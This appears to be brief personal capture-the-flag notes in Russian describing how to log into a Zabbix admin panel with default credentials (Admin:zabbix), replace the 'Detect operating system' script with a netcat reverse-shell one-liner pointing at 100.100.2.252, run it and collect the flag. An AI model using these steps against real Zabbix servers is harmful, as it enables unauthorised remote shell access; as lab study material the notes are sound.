Входим в админку Admin:zabbix

Переходим в alert/script и изменяем скрипт Detect operating system на rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 100.100.2.252 6655 >/tmp/f

Запускаем скрипт с главной страницы и забираем флаг

![[../../Pasted image 20250609152014.png]]